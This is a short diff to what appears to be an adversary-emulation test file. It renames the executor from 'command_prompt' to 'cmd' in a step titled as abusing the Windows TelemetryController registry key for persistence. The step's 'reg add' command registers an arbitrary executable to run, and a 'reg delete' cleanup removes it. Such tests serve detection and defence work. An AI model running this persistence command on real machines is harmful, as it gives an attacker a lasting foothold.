@@ -22,8 +22,8 @@ steps:
     - name: abusing-windows-telemetrycontroller-registry-key-for-persistence
       inline: |
         reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\{{.Args.new_key}}" /t REG_SZ /v Command /d {{.Args.new_executable}} /f
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\{{.Args.new_key}}" /f
-        executor: command_prompt
+        executor: cmd
